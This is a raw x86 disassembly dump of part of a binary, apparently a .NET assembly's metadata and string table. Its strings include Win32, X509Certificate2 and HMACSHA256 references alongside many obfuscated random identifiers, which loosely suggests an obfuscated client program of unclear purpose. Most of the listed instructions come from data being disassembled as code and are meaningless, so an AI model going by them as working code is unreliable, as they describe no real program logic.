  4075f4:	bf 00 00 00 62       	mov    $0x62000000,%edi
  4075f9:	1e                   	push   %ds
  4075fa:	b7 00                	mov    $0x0,%bh
  4075fc:	00 00                	add    %al,(%eax)
  4075fe:	5f                   	pop    %edi
  4075ff:	1c c3                	sbb    $0xc3,%al
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 2d 0b f8 01 00    	add    %ch,0x1f80b
  407609:	00 be 06 fe 01 00    	add    %bh,0x1fe06(%esi)
  40760f:	00 b9 18 69 02 00    	add    %bh,0x26918(%ecx)
  407615:	00 e6                	add    %ah,%dh
  407617:	03 6d 02             	add    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	95                   	xchg   %eax,%ebp
  40761d:	05 71 02 00 00       	add    $0x271,%eax
  407622:	2e 1b 75 02          	sbb    %cs:0x2(%ebp),%esi
  407626:	00 00                	add    %al,(%eax)
  407628:	84 0a                	test   %cl,(%edx)
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 b6 17 a9 17 c1    	add    %dh,-0x3ee856e9(%esi)
  407709:	17                   	pop    %ss
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	be 24 01 00 00       	mov    $0x124,%esi
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	66 23 01             	and    (%ecx),%ax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40772b:	0e                   	push   %cs
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	91                   	xchg   %eax,%ecx
  407733:	22 02                	and    (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	c6                   	(bad)
  40773b:	10 02                	adc    %al,(%edx)
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	2c 17                	sub    $0x17,%al
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	5d                   	pop    %ebp
  407765:	00 00                	add    %al,(%eax)
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	36 0a 00             	or     %ss:(%eax),%al
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	78 18                	js     0x4077a4
  40778c:	00 00                	add    %al,(%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 bb 14 00 00 00    	add    %bh,0x14(%ebx)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	67 10 00             	adc    %al,(%bx,%si)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 fd                	add    %bh,%ch
  4077c7:	0a 00                	or     (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 3d 22 00 00 00    	add    %bh,0x22
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	e7 1f                	out    %eax,$0x1f
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 7f 1b             	add    %bh,0x1b(%edi)
  407804:	00 00                	add    %al,(%eax)
  407806:	00 00                	add    %al,(%eax)
  407808:	0c 00                	or     $0x0,%al
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	43                   	inc    %ebx
  40787a:	6c                   	insb   (%dx),%es:(%edi)
  40787b:	69 65 6e 74 33 00 54 	imul   $0x54003374,0x6e(%ebp),%esp
  407882:	6f                   	outsl  %ds:(%esi),(%dx)
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 36                	je     0x4078c6
  407890:	34 00                	xor    $0x0,%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	55                   	push   %ebp
  407895:	49                   	dec    %ecx
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40789e:	6e                   	outsb  %ds:(%esi),(%dx)
  40789f:	74 31                	je     0x4078d2
  4078a1:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4078a5:	41                   	inc    %ecx
  4078a6:	43                   	inc    %ebx
  4078a7:	53                   	push   %ebx
  4078a8:	48                   	dec    %eax
  4078a9:	41                   	inc    %ecx
  4078aa:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078b0:	74 5f                	je     0x407911
  4078b2:	55                   	push   %ebp
  4078b3:	54                   	push   %esp
  4078b4:	46                   	inc    %esi
  4078b5:	38 00                	cmp    %al,(%eax)
  4078b7:	3c 4d                	cmp    $0x4d,%al
  4078b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ba:	64 75 6c             	fs jne 0x407929
  4078bd:	65 3e 00 52 74       	gs add %dl,%ds:0x74(%edx)
  4078c2:	72 6d                	jb     0x407931
  4078c4:	71 71                	jno    0x407937
  4078c6:	71 65                	jno    0x40792d
  4078c8:	47                   	inc    %edi
  4078c9:	43                   	inc    %ebx
  4078ca:	61                   	popa
  4078cb:	76 4f                	jbe    0x40791c
  4078cd:	41                   	inc    %ecx
  4078ce:	00 48 67             	add    %cl,0x67(%eax)
  4078d1:	4b                   	dec    %ebx
  4078d2:	4a                   	dec    %edx
  4078d3:	75 4f                	jne    0x407924
  4078d5:	64 6c                	fs insb (%dx),%es:(%edi)
  4078d7:	43                   	inc    %ebx
  4078d8:	58                   	pop    %eax
  4078d9:	49                   	dec    %ecx
  4078da:	72 6b                	jb     0x407947
  4078dc:	50                   	push   %eax
  4078dd:	65 41                	gs inc %ecx
  4078df:	00 54 4d 6f          	add    %dl,0x6f(%ebp,%ecx,2)
  4078e3:	62 67 73             	bound  %esp,0x73(%edi)
  4078e6:	7a 67                	jp     0x40794f
  4078e8:	62 73 52             	bound  %esi,0x52(%ebx)
  4078eb:	59                   	pop    %ecx
  4078ec:	72 41                	jb     0x40792f
  4078ee:	00 43 65             	add    %al,0x65(%ebx)
  4078f1:	4d                   	dec    %ebp
  4078f2:	72 59                	jb     0x40794d
  4078f4:	4c                   	dec    %esp
  4078f5:	75 42                	jne    0x407939
  4078f7:	68 73 57 74 41       	push   $0x41745773
  4078fc:	00 74 58 4e          	add    %dh,0x4e(%eax,%ebx,2)
  407900:	79 41                	jns    0x407943
  407902:	51                   	push   %ecx
  407903:	41                   	inc    %ecx
  407904:	7a 76                	jp     0x40797c
  407906:	57                   	push   %edi
  407907:	75 41                	jne    0x40794a
  407909:	00 72 7a             	add    %dh,0x7a(%edx)
  40790c:	6d                   	insl   (%dx),%es:(%edi)
  40790d:	49                   	dec    %ecx
  40790e:	70 65                	jo     0x407975
  407910:	77 66                	ja     0x407978
  407912:	70 4b                	jo     0x40795f
  407914:	66 64 42             	fs inc %dx
  407917:	00 6e 6e             	add    %ch,0x6e(%esi)
  40791a:	65 45                	gs inc %ebp
  40791c:	4d                   	dec    %ebp
  40791d:	77 63                	ja     0x407982
  40791f:	45                   	inc    %ebp
  407920:	58                   	pop    %eax
  407921:	7a 6b                	jp     0x40798e
  407923:	54                   	push   %esp
  407924:	61                   	popa
  407925:	6e                   	outsb  %ds:(%esi),(%dx)
  407926:	42                   	inc    %edx
  407927:	00 56 62             	add    %dl,0x62(%esi)
  40792a:	45                   	inc    %ebp
  40792b:	4a                   	dec    %edx
  40792c:	63 79 53             	arpl   %edi,0x53(%ecx)
  40792f:	6e                   	outsb  %ds:(%esi),(%dx)
  407930:	70 65                	jo     0x407997
  407932:	70 42                	jo     0x407976
  407934:	00 4a 74             	add    %cl,0x74(%edx)
  407937:	6b 78 62 55          	imul   $0x55,0x62(%eax),%edi
  40793b:	5a                   	pop    %edx
  40793c:	63 6d 6a             	arpl   %ebp,0x6a(%ebp)
  40793f:	75 42                	jne    0x407983
  407941:	00 53 4d             	add    %dl,0x4d(%ebx)
  407944:	58                   	pop    %eax
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	71 4a                	jno    0x407992
  407948:	43                   	inc    %ebx
  407949:	50                   	push   %eax
  40794a:	41                   	inc    %ecx
  40794b:	78 42                	js     0x40798f
  40794d:	00 47 43             	add    %al,0x43(%edi)
  407950:	00 63 71             	add    %ah,0x71(%ebx)
  407953:	62 74 75 51          	bound  %esi,0x51(%ebp,%esi,2)
  407957:	4e                   	dec    %esi
  407958:	62 64 77 66          	bound  %esp,0x66(%edi,%esi,2)
  40795c:	6f                   	outsl  %ds:(%esi),(%dx)
  40795d:	58                   	pop    %eax
  40795e:	6c                   	insb   (%dx),%es:(%edi)
  40795f:	59                   	pop    %ecx
  407960:	65 43                	gs inc %ebx
  407962:	00 72 57             	add    %dh,0x57(%edx)
  407965:	47                   	inc    %edi
  407966:	47                   	inc    %edi
  407967:	63 50 6a             	arpl   %edx,0x6a(%eax)
  40796a:	63 6f 73             	arpl   %ebp,0x73(%edi)
  40796d:	46                   	inc    %esi
  40796e:	78 68                	js     0x4079d8
  407970:	43                   	inc    %ebx
  407971:	00 4b 66             	add    %cl,0x66(%ebx)
  407974:	43                   	inc    %ebx
  407975:	53                   	push   %ebx
  407976:	61                   	popa
  407977:	6d                   	insl   (%dx),%es:(%edi)
  407978:	46                   	inc    %esi
  407979:	55                   	push   %ebp
  40797a:	76 6a                	jbe    0x4079e6
  40797c:	43                   	inc    %ebx
  40797d:	00 44 6c 75          	add    %al,0x75(%esp,%ebp,2)
  407981:	7a 54                	jp     0x4079d7
  407983:	51                   	push   %ecx
  407984:	67 77 67             	addr16 ja 0x4079ee
  407987:	6e                   	outsb  %ds:(%esi),(%dx)
  407988:	72 43                	jb     0x4079cd
  40798a:	00 42 4a             	add    %al,0x4a(%edx)
  40798d:	51                   	push   %ecx
  40798e:	48                   	dec    %eax
  40798f:	77 6f                	ja     0x407a00
  407991:	4b                   	dec    %ebx
  407992:	44                   	inc    %esp
  407993:	67 6e                	outsb  %ds:(%si),(%dx)
  407995:	46                   	inc    %esi
  407996:	41                   	inc    %ecx
  407997:	44                   	inc    %esp
  407998:	00 55 53             	add    %dl,0x53(%ebp)
  40799b:	41                   	inc    %ecx
  40799c:	73 56                	jae    0x4079f4
  40799e:	42                   	inc    %edx
  40799f:	58                   	pop    %eax
  4079a0:	76 4d                	jbe    0x4079ef
  4079a2:	5a                   	pop    %edx
  4079a3:	50                   	push   %eax
  4079a4:	42                   	inc    %edx
  4079a5:	44                   	inc    %esp
  4079a6:	00 4d 61             	add    %cl,0x61(%ebp)
  4079a9:	70 4e                	jo     0x4079f9
  4079ab:	61                   	popa
  4079ac:	6d                   	insl   (%dx),%es:(%edi)
  4079ad:	65 54                	gs push %esp
  4079af:	6f                   	outsl  %ds:(%esi),(%dx)
  4079b0:	4f                   	dec    %edi
  4079b1:	49                   	dec    %ecx
  4079b2:	44                   	inc    %esp
  4079b3:	00 67 65             	add    %ah,0x65(%edi)
  4079b6:	74 5f                	je     0x407a17
  4079b8:	46                   	inc    %esi
  4079b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ba:	72 6d                	jb     0x407a29
  4079bc:	61                   	popa
  4079bd:	74 49                	je     0x407a08
  4079bf:	44                   	inc    %esp
  4079c0:	00 42 6a             	add    %al,0x6a(%edx)
  4079c3:	46                   	inc    %esi
  4079c4:	4c                   	dec    %esp
  4079c5:	4b                   	dec    %ebx
  4079c6:	5a                   	pop    %edx
  4079c7:	53                   	push   %ebx
  4079c8:	4c                   	dec    %esp
  4079c9:	54                   	push   %esp
  4079ca:	44                   	inc    %esp
  4079cb:	00 6d 47             	add    %ch,0x47(%ebp)
  4079ce:	66 68 78 44          	pushw  $0x4478
  4079d2:	56                   	push   %esi
  4079d3:	57                   	push   %edi
  4079d4:	66 62 54 44 00       	bound  %dx,0x0(%esp,%eax,2)
  4079d9:	5a                   	pop    %edx
  4079da:	4f                   	dec    %edi
  4079db:	56                   	push   %esi
  4079dc:	4a                   	dec    %edx
  4079dd:	79 50                	jns    0x407a2f
  4079df:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e0:	62 56 44             	bound  %edx,0x44(%esi)
  4079e3:	00 5a 4c             	add    %bl,0x4c(%edx)
  4079e6:	68 50 6a 55 63       	push   $0x63556a50
  4079eb:	42                   	inc    %edx
  4079ec:	54                   	push   %esp
  4079ed:	7a 6b                	jp     0x407a5a
  4079ef:	44                   	inc    %esp
  4079f0:	00 73 68             	add    %dh,0x68(%ebx)
  4079f3:	4b                   	dec    %ebx
  4079f4:	7a 6e                	jp     0x407a64
  4079f6:	65 49                	gs dec %ecx
  4079f8:	52                   	push   %edx
  4079f9:	6c                   	insb   (%dx),%es:(%edi)
  4079fa:	44                   	inc    %esp
  4079fb:	00 6f 72             	add    %ch,0x72(%edi)
  4079fe:	65 73 6a             	gs jae 0x407a6b
  407a01:	75 47                	jne    0x407a4a
  407a03:	47                   	inc    %edi
  407a04:	71 74                	jno    0x407a7a
  407a06:	51                   	push   %ecx
  407a07:	59                   	pop    %ecx
  407a08:	48                   	dec    %eax
  407a09:	41                   	inc    %ecx
  407a0a:	47                   	inc    %edi
  407a0b:	71 44                	jno    0x407a51
  407a0d:	00 47 7a             	add    %al,0x7a(%edi)
  407a10:	73 58                	jae    0x407a6a
  407a12:	68 71 4f 6d 71       	push   $0x716d4f71
  407a17:	66 44                	inc    %sp
  407a19:	45                   	inc    %ebp
  407a1a:	00 6e 59             	add    %ch,0x59(%esi)
  407a1d:	65 48                	gs dec %eax
  407a1f:	76 65                	jbe    0x407a86
  407a21:	44                   	inc    %esp
  407a22:	4a                   	dec    %edx
  407a23:	49                   	dec    %ecx
  407a24:	4b                   	dec    %ebx
  407a25:	45                   	inc    %ebp
  407a26:	00 4d 70             	add    %cl,0x70(%ebp)
  407a29:	79 6a                	jns    0x407a95
  407a2b:	6d                   	insl   (%dx),%es:(%edi)
  407a2c:	7a 71                	jp     0x407a9f
  407a2e:	64 54                	fs push %esp
  407a30:	5a                   	pop    %edx
  407a31:	45                   	inc    %ebp
  407a32:	00 4a 51             	add    %cl,0x51(%edx)
  407a35:	4a                   	dec    %edx
  407a36:	6c                   	insb   (%dx),%es:(%edi)
  407a37:	75 44                	jne    0x407a7d
  407a39:	78 47                	js     0x407a82
  407a3b:	56                   	push   %esi
  407a3c:	57                   	push   %edi
  407a3d:	62 45 00             	bound  %eax,0x0(%ebp)
  407a40:	42                   	inc    %edx
  407a41:	69 4f 55 45 54 54 74 	imul   $0x74545445,0x55(%edi),%ecx
  407a48:	6c                   	insb   (%dx),%es:(%edi)
  407a49:	6e                   	outsb  %ds:(%esi),(%dx)
  407a4a:	68 45 00 72 4b       	push   $0x4b720045
  407a4f:	73 6d                	jae    0x407abe
  407a51:	5a                   	pop    %edx
  407a52:	6c                   	insb   (%dx),%es:(%edi)
  407a53:	7a 57                	jp     0x407aac
  407a55:	4d                   	dec    %ebp
  407a56:	70 45                	jo     0x407a9d
  407a58:	00 64 63 6a          	add    %ah,0x6a(%ebx,%eiz,2)
  407a5c:	4a                   	dec    %edx
  407a5d:	62 78 78             	bound  %edi,0x78(%eax)
  407a60:	49                   	dec    %ecx
  407a61:	6c                   	insb   (%dx),%es:(%edi)
  407a62:	62 4b 73             	bound  %ecx,0x73(%ebx)
  407a65:	45                   	inc    %ebp
  407a66:	00 58 63             	add    %bl,0x63(%eax)
  407a69:	58                   	pop    %eax
  407a6a:	79 44                	jns    0x407ab0
  407a6c:	41                   	inc    %ecx
  407a6d:	4b                   	dec    %ebx
  407a6e:	55                   	push   %ebp
  407a6f:	49                   	dec    %ecx
  407a70:	75 45                	jne    0x407ab7
  407a72:	00 59 47             	add    %bl,0x47(%ecx)
  407a75:	47                   	inc    %edi
  407a76:	6d                   	insl   (%dx),%es:(%edi)
  407a77:	48                   	dec    %eax
  407a78:	67 58                	addr16 pop %eax
  407a7a:	67 59                	addr16 pop %ecx
  407a7c:	75 45                	jne    0x407ac3
  407a7e:	00 59 71             	add    %bl,0x71(%ecx)
  407a81:	70 68                	jo     0x407aeb
  407a83:	4d                   	dec    %ebp
  407a84:	4f                   	dec    %edi
  407a85:	6e                   	outsb  %ds:(%esi),(%dx)
  407a86:	42                   	inc    %edx
  407a87:	4b                   	dec    %ebx
  407a88:	78 45                	js     0x407acf
  407a8a:	00 79 6f             	add    %bh,0x6f(%ecx)
  407a8d:	6d                   	insl   (%dx),%es:(%edi)
  407a8e:	53                   	push   %ebx
  407a8f:	63 47 62             	arpl   %eax,0x62(%edi)
  407a92:	6d                   	insl   (%dx),%es:(%edi)
  407a93:	6d                   	insl   (%dx),%es:(%edi)
  407a94:	4f                   	dec    %edi
  407a95:	67 71 45             	addr16 jno 0x407add
  407a98:	54                   	push   %esp
  407a99:	46                   	inc    %esi
  407a9a:	00 6b 70             	add    %ch,0x70(%ebx)
  407a9d:	52                   	push   %edx
  407a9e:	7a 56                	jp     0x407af6
  407aa0:	52                   	push   %edx
  407aa1:	76 56                	jbe    0x407af9
  407aa3:	7a 58                	jp     0x407afd
  407aa5:	54                   	push   %esp
  407aa6:	46                   	inc    %esi
  407aa7:	00 4e 4c             	add    %cl,0x4c(%esi)
  407aaa:	6a 44                	push   $0x44
  407aac:	53                   	push   %ebx
  407aad:	4e                   	dec    %esi
  407aae:	61                   	popa
  407aaf:	4a                   	dec    %edx
  407ab0:	4a                   	dec    %edx
  407ab1:	75 4b                	jne    0x407afe
  407ab3:	6a 4b                	push   $0x4b
  407ab5:	66 46                	inc    %si
  407ab7:	00 64 64 79          	add    %ah,0x79(%esp,%eiz,2)
  407abb:	48                   	dec    %eax
  407abc:	66 6b 79 48 52       	imul   $0x52,0x48(%ecx),%di
  407ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac2:	4e                   	dec    %esi
  407ac3:	6b 46 00 51          	imul   $0x51,0x0(%esi),%eax
  407ac7:	4c                   	dec    %esp
  407ac8:	5a                   	pop    %edx
  407ac9:	70 65                	jo     0x407b30
  407acb:	76 68                	jbe    0x407b35
  407acd:	4d                   	dec    %ebp
  407ace:	59                   	pop    %ecx
  407acf:	77 61                	ja     0x407b32
  407ad1:	53                   	push   %ebx
  407ad2:	59                   	pop    %ecx
  407ad3:	44                   	inc    %esp
  407ad4:	47                   	inc    %edi
  407ad5:	00 6b 6a             	add    %ch,0x6a(%ebx)
  407ad8:	68 43 6f 50 72       	push   $0x72506f43
  407add:	58                   	pop    %eax
  407ade:	70 78                	jo     0x407b58
  407ae0:	6b 50 47 00          	imul   $0x0,0x47(%eax),%edx
  407ae4:	4b                   	dec    %ebx
  407ae5:	57                   	push   %edi
  407ae6:	51                   	push   %ecx
  407ae7:	75 6c                	jne    0x407b55
  407ae9:	4c                   	dec    %esp
  407aea:	47                   	inc    %edi
  407aeb:	79 6f                	jns    0x407b5c
  407aed:	6e                   	outsb  %ds:(%esi),(%dx)
  407aee:	4b                   	dec    %ebx
  407aef:	64 62 54 47 00       	bound  %edx,%fs:0x0(%edi,%eax,2)
  407af4:	75 62                	jne    0x407b58
  407af6:	49                   	dec    %ecx
  407af7:	71 51                	jno    0x407b4a
  407af9:	74 4c                	je     0x407b47
  407afb:	57                   	push   %edi
  407afc:	64 6c                	fs insb (%dx),%es:(%edi)
  407afe:	67 47                	addr16 inc %edi
  407b00:	00 7a 6a             	add    %bh,0x6a(%edx)
  407b03:	56                   	push   %esi
  407b04:	41                   	inc    %ecx
  407b05:	44                   	inc    %esp
  407b06:	42                   	inc    %edx
  407b07:	66 49                	dec    %cx
  407b09:	48                   	dec    %eax
  407b0a:	59                   	pop    %ecx
  407b0b:	74 47                	je     0x407b54
  407b0d:	00 43 53             	add    %al,0x53(%ebx)
  407b10:	54                   	push   %esp
  407b11:	6d                   	insl   (%dx),%es:(%edi)
  407b12:	6a 58                	push   $0x58
  407b14:	4c                   	dec    %esp
  407b15:	68 5a 74 46 48       	push   $0x4846745a
  407b1a:	00 4c 64 66          	add    %cl,0x66(%esp,%eiz,2)
  407b1e:	4f                   	dec    %edi
  407b1f:	5a                   	pop    %edx
  407b20:	55                   	push   %ebp
  407b21:	59                   	pop    %ecx
  407b22:	74 46                	je     0x407b6a
  407b24:	77 68                	ja     0x407b8e
  407b26:	77 61                	ja     0x407b89
  407b28:	47                   	inc    %edi
  407b29:	48                   	dec    %eax
  407b2a:	00 72 4a             	add    %dh,0x4a(%edx)
  407b2d:	65 75 57             	gs jne 0x407b87
  407b30:	4f                   	dec    %edi
  407b31:	6d                   	insl   (%dx),%es:(%edi)
  407b32:	69 6a 5a 48 00 57 6f 	imul   $0x6f570048,0x5a(%edx),%ebp
  407b39:	73 4f                	jae    0x407b8a
  407b3b:	6f                   	outsl  %ds:(%esi),(%dx)
  407b3c:	55                   	push   %ebp
  407b3d:	61                   	popa
  407b3e:	55                   	push   %ebp
  407b3f:	61                   	popa
  407b40:	46                   	inc    %esi
  407b41:	41                   	inc    %ecx
  407b42:	51                   	push   %ecx
  407b43:	62 48 00             	bound  %ecx,0x0(%eax)
  407b46:	4f                   	dec    %edi
  407b47:	61                   	popa
  407b48:	48                   	dec    %eax
  407b49:	51                   	push   %ecx
  407b4a:	59                   	pop    %ecx
  407b4b:	76 42                	jbe    0x407b8f
  407b4d:	78 46                	js     0x407b95
